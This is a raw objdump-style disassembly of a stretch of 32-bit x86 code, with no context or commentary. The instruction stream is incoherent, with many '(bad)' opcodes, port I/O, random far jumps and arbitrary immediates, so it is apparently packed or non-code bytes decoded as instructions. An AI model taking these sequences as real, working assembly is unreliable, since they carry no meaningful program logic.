  41d3d2:	inc    ebx
  41d3d3:	mov    esi,0xadff6fd1
  41d3d8:	sub    eax,0x9bed9c63
  41d3dd:	mov    bl,0x58
  41d3df:	dec    ebx
  41d3e0:	sub    BYTE PTR [edi+0x20],0x2b
  41d3e4:	ds cli 
  41d3e6:	jl     0x41d44a
  41d3e8:	mov    al,0x8d
  41d3ea:	aaa    
  41d3eb:	int    0x31
  41d3ed:	xchg   esi,eax
  41d3ee:	mov    ah,0x73
  41d3f0:	and    cl,BYTE PTR ds:0xf64d2b12
  41d3f6:	mov    WORD PTR [edx],fs
  41d3f8:	pop    ds
  41d3f9:	in     al,dx
  41d3fa:	add    ebp,DWORD PTR [eax-0x758b5071]
  41d400:	add    esi,DWORD PTR [ecx]
  41d402:	out    dx,al
  41d403:	mov    al,0x96
  41d405:	arpl   bx,sp
  41d407:	inc    ebp
  41d408:	xor    ebp,ecx
  41d40a:	ds repz call 0x601b:0xc0035b51
  41d413:	fcom   QWORD PTR [edx-0xb48be6e]
  41d419:	cmp    esp,DWORD PTR [esi-0x77]
  41d41c:	or     esp,DWORD PTR [ebx+esi*1-0x4]
  41d420:	jle    0x41d435
  41d422:	loopne 0x41d3cf
  41d424:	imul   ebp,DWORD PTR [eax+0x16],0x22
  41d428:	xchg   dh,bl
  41d42a:	mov    esp,0x48951233
  41d42f:	push   edi
  41d430:	pop    edx
  41d431:	dec    edi
  41d432:	sbb    DWORD PTR [eax+0x3e],ecx
  41d435:	cmc    
  41d436:	loop   0x41d491
  41d438:	pusha  
  41d439:	gs cmp ebp,edx
  41d43c:	loope  0x41d3ce
  41d43e:	jecxz  0x41d41c
  41d440:	lods   eax,DWORD PTR ds:[esi]
  41d441:	inc    edi
  41d442:	aas    
  41d443:	aaa    
  41d444:	fisttp QWORD PTR [edi+0x4bf629f3]
  41d44a:	lahf   
  41d44b:	xor    eax,0x81027b57
  41d450:	retf   
  41d451:	and    eax,0x5bc83bab
  41d456:	and    BYTE PTR [ebx-0x42ea7a70],ch
  41d45c:	aam    0xda
  41d45e:	scas   al,BYTE PTR es:[edi]
  41d45f:	pop    ss
  41d460:	imul   ecx,ebx,0x785bf1eb
  41d466:	imul   eax,eax,0xffffffc7
  41d469:	push   es
  41d46a:	xchg   edi,eax
  41d46b:	add    DWORD PTR [ebx-0xe],eax
  41d46e:	into   
  41d46f:	sbb    eax,DWORD PTR [eax-0x2895ccdd]
  41d475:	and    BYTE PTR [ebp+edx*4+0x27],bl
  41d479:	or     dh,bh
  41d47b:	jecxz  0x41d48d
  41d47d:	adc    dh,BYTE PTR [esi+0x7b]
  41d480:	mov    BYTE PTR [ebp-0x30],al
  41d483:	and    al,0x6a
  41d485:	xor    dl,bl
  41d487:	std    
  41d488:	(bad)  
  41d489:	jle    0x41d4cf
  41d48b:	(bad)  
  41d48c:	fs mov esp,0xcf0739f0
  41d492:	push   eax
  41d493:	push   ebp
  41d494:	push   ss
  41d495:	xchg   ebx,eax
  41d496:	adc    BYTE PTR [edi+0x50],ch
  41d499:	je     0x41d436
  41d49b:	std    
  41d49c:	xchg   DWORD PTR [bp+di-0x8fd],esp
  41d4a1:	das    
  41d4a2:	cmp    cl,BYTE PTR [edi-0x12]
  41d4a5:	repz mul DWORD PTR [ebx+0x5b]
  41d4a9:	jg     0x41d523
  41d4ab:	pop    eax
  41d4ac:	mov    ebx,0x6d2bf8d9
  41d4b1:	mov    al,0x6d
  41d4b3:	jmp    0x41d4e6
  41d4b5:	ret    
  41d4b6:	nop
  41d4b7:	bound  ebx,QWORD PTR [ebx+eax*8+0x15]
  41d4bb:	and    edx,DWORD PTR [edi+esi*8+0x0]
  41d4bf:	add    BYTE PTR [eax],al
  41d4c1:	add    dl,ah
  41d4c3:	or     al,BYTE PTR [ecx]
  41d4c5:	xchg   ecx,eax
  41d4c6:	jmp    0xbdbdc766
  41d4cb:	adc    esp,esi
  41d4cd:	pop    edi
  41d4ce:	and    BYTE PTR [ebx+0x504d7790],bh
  41d4d4:	add    DWORD PTR [eax],eax
  41d4d6:	hlt    
  41d4d7:	add    al,0x0
  41d4d9:	add    BYTE PTR [edi+0x3],al
  41d4dc:	mov    dh,0x2d
  41d4de:	neg    DWORD PTR [ecx]
  41d4e0:	jg     0x41d50f
  41d4e2:	cmp    eax,0xc3f80f01
  41d4e7:	sub    WORD PTR [ecx+esi*2-0x38],sp
  41d4ec:	or     esp,DWORD PTR [ecx+edi*1+0x29]
  41d4f0:	test   ch,dl
  41d4f2:	sbb    cl,BYTE PTR [edi]
  41d4f4:	ins    BYTE PTR es:[edi],dx
  41d4f5:	adc    bh,BYTE PTR [ecx-0x6d]
  41d4f8:	pusha  
  41d4f9:	inc    ebp
  41d4fa:	daa    
  41d4fb:	mov    ecx,0x157d4247
  41d500:	pushf  
  41d501:	ss dec ecx
  41d503:	test   al,0x61
  41d505:	sub    al,0x23
  41d507:	and    dl,ch
  41d509:	stos   BYTE PTR es:[edi],al
  41d50a:	addr16 popa 
  41d50c:	ins    DWORD PTR es:[edi],dx
  41d50d:	xchg   edx,eax
  41d50e:	rol    DWORD PTR [esp+ecx*2],1
  41d511:	mov    bl,0xe5
  41d513:	shl    DWORD PTR [esi],cl
  41d515:	sahf   
  41d516:	cli    
  41d517:	ret    
  41d518:	sub    ecx,ecx
  41d51a:	retf   0x6796
  41d51d:	dec    ebp
  41d51e:	imul   esp,ebp,0xfffffffc
  41d521:	xchg   esi,eax
  41d522:	sub    eax,0x4f
  41d525:	add    eax,0x3efef278
  41d52a:	or     DWORD PTR [ebx+ebp*2-0x75],ebx
  41d52e:	(bad)  
  41d52f:	outs   dx,DWORD PTR ds:[esi]
  41d530:	push   ds
  41d531:	sub    ch,BYTE PTR [edx]
  41d533:	add    BYTE PTR [ebp+0x743e08c4],cl
  41d539:	lods   al,BYTE PTR ds:[esi]
  41d53a:	lock rol DWORD PTR [ebx-0xc4ab040],1
  41d541:	dec    ebp
  41d542:	call   0x560a:0x84e2449
  41d549:	jg     0x41d5bb
  41d54b:	retf   
  41d54c:	push   eax
  41d54d:	xor    eax,0x1858c3ae
  41d552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d553:	bound  edi,QWORD PTR [ebp-0x34491a83]
  41d559:	mov    eax,ds:0x284364bb
  41d55e:	or     al,0xe8
  41d560:	in     al,dx
  41d561:	fidiv  WORD PTR [edx-0x40aab6ca]
  41d567:	jmp    0xb1783686
  41d56c:	jae    0x41d5bb
  41d56e:	jmp    0x2806:0xa991b2df
  41d575:	pop    es
  41d576:	jecxz  0x41d565
  41d578:	stos   BYTE PTR es:[edi],al
  41d579:	sub    BYTE PTR [ecx-0x39],0x8c
  41d57d:	in     al,dx
  41d57e:	pop    eax
  41d57f:	inc    eax
  41d580:	xchg   ebx,eax
  41d581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d582:	add    bh,dh
  41d584:	adc    BYTE PTR [edx-0x1f],0xe3
  41d588:	mov    ah,0xaa
  41d58a:	push   esp
  41d58b:	sbb    eax,0x637dd92d
  41d590:	pop    ecx
  41d591:	push   ebp
  41d592:	bsf    esi,DWORD PTR [eax]
  41d595:	xlat   BYTE PTR ds:[ebx]
  41d596:	jl     0x41d570
  41d598:	pop    ds
  41d599:	mov    bl,0xd8
  41d59b:	push   ebp
  41d59c:	xchg   DWORD PTR fs:[edx-0x503b7fc5],edx
  41d5a3:	pop    edi
  41d5a4:	add    ch,al
  41d5a6:	fld    QWORD PTR [esi+0x2c]
  41d5a9:	inc    esi
  41d5aa:	push   eax
  41d5ab:	repz je 0x41d552
  41d5ae:	stc    
  41d5af:	(bad)  
  41d5b0:	iret   
  41d5b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b2:	pop    ebx
  41d5b3:	repnz adc eax,DWORD PTR [eax]
  41d5b6:	aaa    
  41d5b7:	das    
  41d5b8:	sbb    DWORD PTR [esp+esi*4],ecx
  41d5bb:	call   0xe838:0xfeac50cf
  41d5c2:	mov    cl,BYTE PTR [ecx+0x6327baee]
  41d5c8:	cmp    BYTE PTR [ebp-0x2a],dh
  41d5cb:	mov    ds:0x68c9fbd5,al
  41d5d0:	arpl   WORD PTR [ebp-0xe836637],dx
  41d5d6:	test   DWORD PTR [edx],ebp
  41d5d8:	jge    0x41d631
  41d5da:	and    ebp,ecx
  41d5dc:	test   BYTE PTR [edx-0x5b],al
  41d5df:	cmp    ch,ah
  41d5e1:	adc    al,BYTE PTR [ecx+ebx*2-0x48]
  41d5e5:	pushf  
  41d5e6:	jbe    0x41d5f4
  41d5e8:	jmp    0x41d665
  41d5ea:	shl    BYTE PTR [esi],cl
  41d5ec:	mov    al,0x38
  41d5ee:	stos   DWORD PTR es:[edi],eax
  41d5ef:	mov    edx,0xc624209b
  41d5f4:	int3   
  41d5f5:	mov    ds:0xb269017c,eax
  41d5fa:	and    bh,BYTE PTR [edi-0x5b]
  41d5fd:	aas    
  41d5fe:	push   ds
  41d5ff:	sar    DWORD PTR [edx-0x36],0xa0
  41d603:	fadd   DWORD PTR [edx-0x2a]
  41d606:	adc    ch,BYTE PTR [esi+ecx*2-0x53]
  41d60a:	rcl    ch,0xa8
  41d60d:	jl     0x41d5c7
  41d60f:	xor    BYTE PTR [eax],bh
  41d611:	aad    0x36
  41d613:	loopne 0x41d68c
  41d615:	es push edx
  41d617:	jp     0x41d5cf
  41d619:	add    DWORD PTR [esi-0x297bd9f9],esi
  41d61f:	stc    
  41d620:	cwde   
  41d621:	popa   
  41d622:	adc    BYTE PTR [eiz*8-0x3253cc22],0xe9
  41d62a:	inc    esi
  41d62b:	pusha  
  41d62c:	mov    dh,0xc6
  41d62e:	or     BYTE PTR [edi+0x5e0adeab],dh
  41d634:	sbb    eax,0x5e5229ba
  41d639:	mov    dl,0x18
  41d63b:	push   ecx
  41d63c:	dec    ecx
  41d63d:	add    DWORD PTR [ebx+0x4f],0xd97d22df
  41d644:	fild   QWORD PTR [edi+edx*8+0x3347c4b9]
  41d64b:	push   0xb64195b4
  41d650:	xor    DWORD PTR [ebx-0x36],edx
  41d653:	(bad)  
  41d655:	cwde   
  41d656:	push   esi
  41d657:	jmp    0x29d7:0xbc634496
  41d65e:	test   DWORD PTR [ebp-0x3b3fde0f],0x8ea0f506
  41d668:	pop    ecx
  41d669:	adc    edx,esp
  41d66b:	nop
  41d66c:	cwde   
  41d66d:	fcomp  QWORD PTR [edx]
  41d66f:	ror    bh,0x8c
  41d672:	jl     0x41d600
  41d674:	lds    ebx,FWORD PTR [ebp-0x7c68777d]
  41d67a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d67b:	retf   0x6a14
  41d67e:	and    esp,DWORD PTR [esi]
  41d680:	(bad)  
  41d682:	cmp    al,0x9d
  41d684:	gs jge 0x41d628
  41d687:	dec    ebp
  41d688:	push   edx
  41d689:	icebp  
  41d68a:	add    BYTE PTR [esi+ebp*8+0x38d9d10c],al
  41d691:	cli    
  41d692:	sub    DWORD PTR [ecx+0x6341d135],ecx
  41d698:	stos   BYTE PTR es:[edi],al
  41d699:	mov    BYTE PTR [edx],al
  41d69b:	cbw    
  41d69d:	cli    
  41d69e:	(bad)  
  41d69f:	mov    ah,0xc0
  41d6a1:	in     eax,0x9b
  41d6a3:	call   0x33d5:0x34d73afa
  41d6aa:	cmp    DWORD PTR [edi-0x69],esi
  41d6ad:	jmp    0x2dec:0x2d5bba2c
  41d6b4:	lds    esp,FWORD PTR [edi]
  41d6b6:	xor    BYTE PTR [ebx],dl
  41d6b8:	xor    BYTE PTR [edx],ah
  41d6ba:	dec    edi
  41d6bb:	jecxz  0x41d647
  41d6bd:	push   0x5c45a13d
  41d6c2:	push   edi
  41d6c3:	shl    DWORD PTR [ecx+eax*2],0x96
  41d6c7:	test   al,0x73
  41d6c9:	xchg   BYTE PTR [ebx-0xc7de085],bl
  41d6cf:	mov    eax,ds:0xd3498728
  41d6d4:	xchg   esi,eax
  41d6d5:	shl    DWORD PTR [ecx+0xf],1
  41d6d8:	jg     0x41d728
  41d6da:	pop    edx
  41d6db:	jb     0x41d6e6
  41d6dd:	xchg   ecx,eax
  41d6de:	jmp    0xce54:0x6e579506
  41d6e5:	sar    BYTE PTR [ebx+0x64],cl
  41d6e8:	jmp    0xd757b31c
  41d6ed:	xchg   BYTE PTR [ebp-0x16d1d7f6],cl
  41d6f3:	mov    DWORD PTR [edx-0x50],ecx
  41d6f6:	adc    BYTE PTR [edi-0x43],dh
  41d6f9:	sbb    ch,BYTE PTR [esi]
  41d6fb:	mov    ebx,0x24780e3d
  41d700:	sbb    al,0x68
  41d702:	cli    
  41d703:	retf   
  41d704:	aam    0x7a
  41d706:	xor    DWORD PTR [edi-0x6b],0x679ab799
  41d70d:	inc    eax
  41d70e:	jnp    0x41d6fe
  41d710:	xor    ecx,edi
  41d712:	mov    al,0x33
  41d714:	mov    ds:0x1111617,eax
  41d719:	imul   ebp,DWORD PTR [ecx],0x40
  41d71c:	pusha  
  41d71d:	sbb    edx,ebx
  41d71f:	lds    ebp,FWORD PTR [eax+0x481502c0]
  41d725:	(bad)  
  41d726:	out    dx,al
  41d727:	js     0x41d791
  41d729:	repz jno 0x41d6d1
  41d72c:	mov    WORD PTR [esi-0x63],ds
  41d72f:	xchg   edi,eax
  41d730:	mov    ebx,ecx
  41d732:	out    0xa,al
  41d734:	mov    ah,BYTE PTR [esp+ebx*4+0x5a29f0f4]
  41d73b:	xchg   ah,al
  41d73d:	jne    0x41d770
  41d73f:	loope  0x41d796
  41d741:	xor    eax,0xc38e3da2
  41d746:	icebp  
  41d747:	or     DWORD PTR [esi+edx*8-0x1e94ba62],0x4f
  41d74f:	ins    BYTE PTR es:[edi],dx
  41d750:	mov    BYTE PTR [edx+0x5df057c2],dl
  41d756:	aad    0xe1
  41d758:	sbb    DWORD PTR [ecx-0x38],esi
  41d75b:	aaa    
  41d75c:	inc    BYTE PTR [eax]
  41d75e:	sbb    DWORD PTR [ebx],0xffffffee
  41d761:	ins    DWORD PTR es:[edi],dx
  41d762:	sar    al,1
  41d764:	mov    esi,0xd4d43f6b
  41d769:	add    esi,ecx
  41d76b:	add    DWORD PTR [ecx+0x21bea0c3],edi
  41d771:	dec    eax
  41d772:	in     al,0xd3
  41d774:	cmp    al,0x99
  41d776:	mov    bl,0xa4
  41d778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d779:	mov    esp,0x8d29f723
  41d77e:	cmp    ebp,DWORD PTR [edi]
  41d780:	mov    dl,0x6d
  41d782:	pop    edx
  41d783:	retf   
  41d784:	int    0x50
  41d786:	jno    0x41d7fb
  41d788:	mov    ch,0x4b
  41d78a:	mov    ds:0x7b5fe37e,eax
  41d78f:	scas   al,BYTE PTR es:[edi]
  41d790:	ret    0xf701
  41d793:	sti    
  41d794:	aas    
  41d795:	aad    0xda
  41d797:	inc    ebx
  41d798:	and    ebx,edi
  41d79a:	inc    BYTE PTR [ebp-0x64]
  41d79d:	ja     0x41d78b
  41d79f:	jge    0x41d7fc
  41d7a1:	scas   eax,DWORD PTR es:[edi]
  41d7a2:	pop    eax
  41d7a3:	sti    
  41d7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7a5:	(bad)  
  41d7a6:	popf   
  41d7a7:	clc    
  41d7a8:	push   esp
  41d7a9:	jb     0x41d731
  41d7ab:	cmp    eax,0x3801ef0
  41d7b0:	inc    eax
  41d7b1:	sub    DWORD PTR [edx+0x68c499f6],esp
  41d7b7:	cdq    
  41d7b8:	xchg   esp,eax
  41d7b9:	dec    BYTE PTR [ebp-0x612c3201]
  41d7bf:	pop    eax
  41d7c0:	or     DWORD PTR [ebx-0x13],0xacfdf709
  41d7c7:	mov    bl,al
  41d7c9:	test   eax,0xed94e05e
  41d7ce:	outs   dx,DWORD PTR ds:[esi]
  41d7cf:	(bad)  
  41d7d0:	arpl   WORD PTR [edx],cx
  41d7d2:	inc    esi
  41d7d3:	(bad)  
  41d7d4:	jb     0x41d7c8
  41d7d6:	xchg   esi,eax
  41d7d7:	neg    DWORD PTR ds:0x5b313a3
  41d7dd:	pusha  
  41d7de:	in     eax,0xc3
  41d7e0:	lea    edi,ds:0xdbc0187
  41d7e6:	(bad)  [edi+0x187de69c]
  41d7ec:	add    dl,al
  41d7ee:	mov    esi,0xf1acc3e7
  41d7f3:	mov    es,WORD PTR [edi-0x4c]
  41d7f6:	mov    edi,0xadc55c14
  41d7fb:	pop    edx
  41d7fc:	mov    dh,0x84
  41d7fe:	cmc    
  41d7ff:	mov    ecx,ebx
  41d801:	shl    BYTE PTR [eax-0x14],0x86
  41d805:	int3   
  41d806:	xor    eax,0x404dc357
  41d80b:	cmp    BYTE PTR [esi+0x0],0x9e
  41d80f:	mov    cl,BYTE PTR [ebx-0x7e]
  41d812:	lods   eax,DWORD PTR ds:[esi]
  41d813:	lods   eax,DWORD PTR ds:[esi]
  41d814:	mov    bh,0x3d
  41d816:	leave  
  41d817:	jae    0x41d852
  41d819:	and    DWORD PTR [ecx+0x1324c3eb],0x67c985a5
  41d823:	fs inc edi
  41d825:	pop    ebx
  41d826:	pop    ss
  41d827:	call   0x62cf94f8
  41d82c:	mov    edi,eax
  41d82e:	and    al,0xc3
  41d830:	and    DWORD PTR [ebx-0x18194312],0xffffffa6
  41d837:	jmp    0xa44:0x274d89ba
  41d83e:	lds    eax,FWORD PTR [ecx+0x3d8ab3f3]
  41d844:	fisubr WORD PTR [esi-0x77b00e67]
  41d84a:	sub    bh,bh
  41d84c:	jmp    0x783641f
  41d851:	inc    edx
  41d852:	popf   
  41d853:	jmp    0x41d835
  41d855:	lock sar DWORD PTR [ebx+0x55],1
  41d859:	pop    edi
  41d85a:	outs   dx,DWORD PTR ds:[esi]
  41d85b:	mov    ds:0x7a474eaf,eax
  41d860:	fld    TBYTE PTR [edi]
  41d862:	adc    DWORD PTR [edi],esi
  41d864:	gs enter 0xe9f,0xd0
  41d869:	dec    ebp
  41d86a:	in     al,dx
  41d86b:	or     ebx,DWORD PTR [ebx+0x4cc13637]
  41d871:	shr    BYTE PTR [edx+0x2e],0xf1
  41d875:	cmc    
  41d876:	shr    DWORD PTR [esi-0x30a7c6f8],cl
  41d87c:	mov    bh,0x59
  41d87e:	cs leave 
  41d880:	inc    eax
  41d881:	jl     0x41d8b1
  41d883:	popa   
  41d884:	je     0x41d8b2
  41d886:	add    DWORD PTR [esi],ecx
  41d888:	lahf   
  41d889:	ja     0x41d825
  41d88b:	sbb    al,0x81
  41d88d:	loop   0x41d8c0
  41d88f:	loope  0x41d87a
  41d891:	lods   eax,DWORD PTR ds:[esi]
  41d892:	scas   eax,DWORD PTR es:[edi]
  41d893:	add    eax,0x63d83956
  41d898:	sub    al,0xf5
  41d89a:	cdq    
  41d89b:	push   ds
  41d89c:	fsubr  QWORD PTR [ecx+0x72]
  41d89f:	push   edi
  41d8a0:	cmp    ebx,edx
  41d8a2:	mov    bh,0xe
  41d8a4:	fs das 
  41d8a6:	adc    al,0xb6
  41d8a8:	fsub   DWORD PTR [edx-0x12]
  41d8ab:	sbb    esi,edx
  41d8ad:	cmp    ebx,esi
  41d8af:	inc    esi
  41d8b0:	cmp    ecx,DWORD PTR [edx-0x65f12dc4]
  41d8b6:	pop    ebp
  41d8b7:	mov    bh,0x8b
  41d8b9:	mov    ah,0xa7
  41d8bb:	xlat   BYTE PTR ds:[ebx]
  41d8bc:	pusha  
  41d8bd:	mov    DWORD PTR ds:0x2146a93c,ebx
  41d8c3:	push   edi
  41d8c4:	pushf  
  41d8c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c6:	and    ecx,DWORD PTR [ebx-0x7274f87e]
  41d8cc:	inc    ecx
  41d8cd:	pop    ds
  41d8ce:	imul   ebp,DWORD PTR [ebp-0x1a],0x31e8b559
  41d8d5:	in     al,dx
  41d8d6:	sub    edx,edx
  41d8d8:	cmp    DWORD PTR [ecx],edx
  41d8da:	or     DWORD PTR [edx+ecx*4-0x48],ebp
  41d8de:	aaa    
  41d8df:	dec    esi
  41d8e0:	stos   BYTE PTR es:[edi],al
  41d8e1:	dec    esi
  41d8e2:	icebp  
  41d8e3:	in     al,0x8d
  41d8e5:	mov    eax,ds:0x7ab81964
  41d8ea:	sub    al,0xa4
  41d8ec:	cmp    eax,edx
  41d8ee:	add    eax,0x98790b26
  41d8f3:	es cmp dh,dh
  41d8f6:	adc    eax,0x79a802d9
  41d8fb:	mov    DWORD PTR [ecx],ebp
  41d8fd:	jp     0x41d8ad
  41d8ff:	push   ss
  41d900:	pop    ebp
  41d901:	add    al,0x35
  41d903:	imul   esp,DWORD PTR [eax-0x8],0x5d
  41d907:	xor    DWORD PTR [edx+ebp*8+0x40],edi
  41d90b:	xchg   BYTE PTR [edx-0x32],dh
  41d90e:	test   BYTE PTR [ecx+esi*2],0xf
  41d912:	test   BYTE PTR es:[edx-0x23b45844],bl
  41d919:	out    dx,eax
  41d91a:	ss jl  0x41d8c9
  41d91d:	fist   DWORD PTR [edx]
  41d91f:	push   ss
  41d920:	sar    DWORD PTR [ecx+0x25d6fc66],1
  41d926:	inc    ebx
  41d927:	pop    ebx
  41d928:	(bad)  
  41d929:	mov    BYTE PTR [ebx+0x60d8ccef],0x51
  41d930:	jne    0x41d99b
  41d932:	imul   edx,ebp,0x39
  41d935:	push   esp
  41d936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d937:	fisub  DWORD PTR [edx]
  41d939:	cs ja  0x41d998
  41d93c:	repnz data16 xor BYTE PTR [eax-0x6f11993d],bl
  41d944:	or     BYTE PTR [eax-0x3f],cl
  41d947:	leave  
  41d948:	aas    
  41d949:	stos   DWORD PTR es:[edi],eax
  41d94a:	or     cl,BYTE PTR [edx]
  41d94c:	pop    edi
  41d94d:	and    BYTE PTR [ecx+0x177bc9ac],dl
  41d953:	je     0x41d93d
  41d955:	jmp    0xe77a:0x22b9506e
  41d95c:	les    ecx,FWORD PTR [edi-0x11df99ae]
  41d962:	inc    eax
  41d963:	xchg   BYTE PTR [ecx+0x25],dh
  41d966:	xor    BYTE PTR [ecx],dh
  41d968:	enter  0xe55f,0xcf
  41d96c:	shl    DWORD PTR ds:0x26bbdb00,cl
  41d972:	sub    ecx,edx
  41d974:	xchg   esi,eax
  41d975:	sbb    BYTE PTR [edi+0x40],ah
  41d978:	xor    al,0xfb
  41d97a:	mov    edx,0xe9319e5c
  41d97f:	aas    
  41d980:	pop    edx
  41d981:	cmp    ebp,ebx
  41d983:	jge    0x41d989
  41d985:	push   edx
  41d986:	inc    esp
  41d987:	(bad)  
  41d988:	in     eax,dx
  41d989:	jno    0x41d9c8
  41d98b:	add    eax,0xeec479a9
  41d990:	jo     0x41d921
  41d992:	mov    BYTE PTR [ebp+0x26],dl
  41d995:	fild   DWORD PTR [eax+0x6c6d3513]
  41d99b:	add    BYTE PTR [edx-0x72],al
  41d99e:	(bad)  
  41d99f:	call   0x42f3:0xa5e582ce
  41d9a6:	cmp    eax,0xbc34cc22
  41d9ab:	ins    DWORD PTR es:[edi],dx
  41d9ac:	and    al,0xe1
  41d9ae:	cld    
  41d9af:	in     al,dx
  41d9b0:	xor    eax,0x8bea3ed2
  41d9b5:	cli    
  41d9b6:	xor    DWORD PTR [esi],ebp
  41d9b8:	ins    DWORD PTR es:[edi],dx
  41d9b9:	or     DWORD PTR [edi+0x6a],ebp
  41d9bc:	int    0x43
  41d9be:	mov    edx,0x11c4f95c
  41d9c3:	sub    eax,0x20c24c34
  41d9c8:	sub    BYTE PTR [edi],dl
  41d9ca:	sbb    dh,BYTE PTR [edx]
  41d9cc:	xor    edi,eax
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	add    BYTE PTR [eax],al
  41d9d2:	pop    esi
  41d9d3:	pop    esi
  41d9d4:	loope  0x41da44
  41d9d6:	loope  0x41d9d7
  41d9d8:	fistp  QWORD PTR [esi-0x6e]
  41d9db:	adc    DWORD PTR [esi],0xa
  41d9de:	sub    DWORD PTR [ecx-0x7b],0x1554197
  41d9e5:	add    ah,dh
  41d9e7:	add    al,0x0
  41d9e9:	add    BYTE PTR [ecx+esi*1+0x32],ch
  41d9ed:	xor    DWORD PTR [ebp+0x2],ecx
  41d9f0:	or     DWORD PTR [eax+0x73b9456],eax
  41d9f6:	arpl   WORD PTR [ecx-0x127440da],bx
  41d9fc:	pop    edx
  41d9fd:	repz std 
  41d9ff:	or     DWORD PTR [edx-0xd],esi
  41da02:	dec    ecx
  41da03:	aas    
  41da04:	jmp    0x41da06
  41da06:	jp     0x41d9d2
  41da08:	push   esp
  41da09:	call   0x419f3811
  41da0e:	mov    al,0xff
  41da10:	imul   eax,DWORD PTR [eax],0xdbd2f33b
  41da16:	add    bl,BYTE PTR [eax+0xe]
  41da19:	xor    eax,0xd839c7fd
  41da1e:	dec    esi
  41da1f:	mov    ch,BYTE PTR ds:[edx-0x3bbb5aea]
  41da26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da27:	push   ss
  41da28:	and    eax,0xb39dbdad
  41da2d:	js     0x41da38
  41da2f:	xchg   BYTE PTR [ebx-0xe],ah
  41da32:	mov    bh,dh
  41da34:	mov    cl,0x93
  41da36:	or     BYTE PTR ds:0x5809d88d,dh
  41da3c:	sub    BYTE PTR [eax+0x38e0307b],ch
  41da42:	inc    ecx
  41da43:	dec    esp
  41da44:	xchg   ebx,eax
  41da45:	xchg   ebp,eax
  41da46:	mov    dl,0x3e
  41da48:	std    
  41da49:	push   esi
  41da4a:	inc    esi
  41da4b:	popf   
  41da4c:	jle    0x41daaa
  41da4e:	(bad)  
  41da4f:	jmp    0xd772b16d
  41da54:	dec    esi
  41da55:	inc    ebx
  41da56:	std    
  41da57:	push   ds
  41da58:	sbb    al,0x57
  41da5a:	cdq    
  41da5b:	sub    BYTE PTR [ecx+0x377c22e4],0x46
  41da62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da63:	jo     0x41dac2
  41da65:	shl    BYTE PTR [esi],cl
  41da67:	xchg   ecx,eax
  41da68:	jg     0x41da80
  41da6a:	(bad)  
  41da6b:	xor    ecx,esp
  41da6d:	jecxz  0x41dac4
  41da6f:	in     eax,dx
  41da70:	sub    eax,0xf7138e9
  41da75:	rcr    BYTE PTR [edi-0x36cdc906],0x55
  41da7c:	dec    ebx
  41da7e:	shr    esi,0x8c
  41da81:	fdiv   st(2),st
  41da83:	(bad)  
  41da84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da85:	(bad)  
  41da86:	adc    DWORD PTR [eax-0x34],ecx
  41da89:	xchg   esp,eax
  41da8a:	push   ebx
  41da8b:	mov    dl,0x7c
  41da8d:	js     0x41dadf
  41da8f:	push   ecx
  41da90:	out    0x34,al
  41da92:	dec    esi
  41da93:	aad    0x6d
  41da95:	pop    ds
  41da96:	inc    edx
  41da97:	inc    ecx
  41da98:	push   eax
  41da99:	lods   eax,DWORD PTR ds:[esi]
  41da9a:	and    eax,0xa365c012
  41da9f:	fisttp WORD PTR [edi+0x7bf9df5]
  41daa5:	add    al,0xb4
  41daa7:	xchg   esp,eax
  41daa8:	jb     0x41da3f
  41daaa:	retf   0x712a
  41daad:	int    0x98
  41daaf:	es cs mov es:0xd364a495,al
  41dab7:	mov    cs,WORD PTR [eax+ebx*2+0x43]
  41dabb:	cdq    
  41dabc:	lock retf 0x2f0d
  41dac0:	fdivr  DWORD PTR [ebp-0x76d853a8]
  41dac6:	rcl    DWORD PTR [ebx+ecx*8],0xb2
  41daca:	retf   0x1f17
  41dacd:	push   edx
  41dace:	push   eax
  41dacf:	jmp    0x41db17
  41dad1:	adc    eax,0xadac01c
  41dad6:	add    DWORD PTR ds:0x1d7c5e2b,eax
  41dadc:	mov    edx,0xc1aff8f3
  41dae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dae2:	fwait
  41dae3:	ja     0x41daea
  41dae5:	(bad)  
  41dae6:	cdq    
  41dae7:	ins    DWORD PTR es:[edi],dx
  41dae8:	xchg   edi,eax
  41dae9:	jecxz  0x41da7d
  41daeb:	shl    BYTE PTR [eax+ecx*8],0x2
  41daef:	loopne 0x41db3c
  41daf1:	mov    eax,ds:0x1c321380
  41daf6:	lock sub bh,bl
  41daf9:	push   ecx
  41dafa:	adc    DWORD PTR [edx+0x4b],0x64
  41dafe:	and    BYTE PTR ds:0x241402c0,ch
  41db04:	jmp    DWORD PTR [edx]
  41db06:	mov    eax,ds:0x5818bd79
  41db0b:	add    BYTE PTR [edi-0xb],al
  41db0e:	push   edi
  41db0f:	push   es
  41db10:	and    DWORD PTR [esi-0x1e228dd8],edx
  41db16:	mov    al,0x12
  41db18:	sahf   
  41db19:	pushf  
  41db1a:	xor    dl,bh
  41db1c:	jecxz  0x41db55
  41db1e:	aam    0x42
  41db20:	jg     0x41db84
  41db22:	int    0x90
  41db24:	sbb    eax,0x88711628
  41db29:	jmp    0xb3d5:0xa66ea94c
  41db30:	dec    esi
  41db31:	fild   QWORD PTR [ebx+0x169b7eff]
  41db37:	xchg   edx,eax
  41db38:	xor    eax,0xe4c3aaa8
  41db3d:	pop    ebx
  41db3e:	mov    ch,0x34
  41db40:	push   ds
  41db41:	sub    al,0x68
  41db43:	xchg   DWORD PTR [edx],ecx
  41db45:	in     eax,0xa4
  41db47:	xchg   ebx,eax
  41db48:	dec    esp
  41db49:	sbb    ecx,DWORD PTR [ebx+0x1714c960]
  41db4f:	cwde   
  41db50:	xor    dh,dl
  41db52:	ds push es
  41db54:	mov    ds:0xe1a0a8ce,al
  41db59:	push   eax
  41db5a:	test   DWORD PTR ds:0xd618703b,0x9271a936
  41db64:	push   ss
  41db65:	sub    ch,al
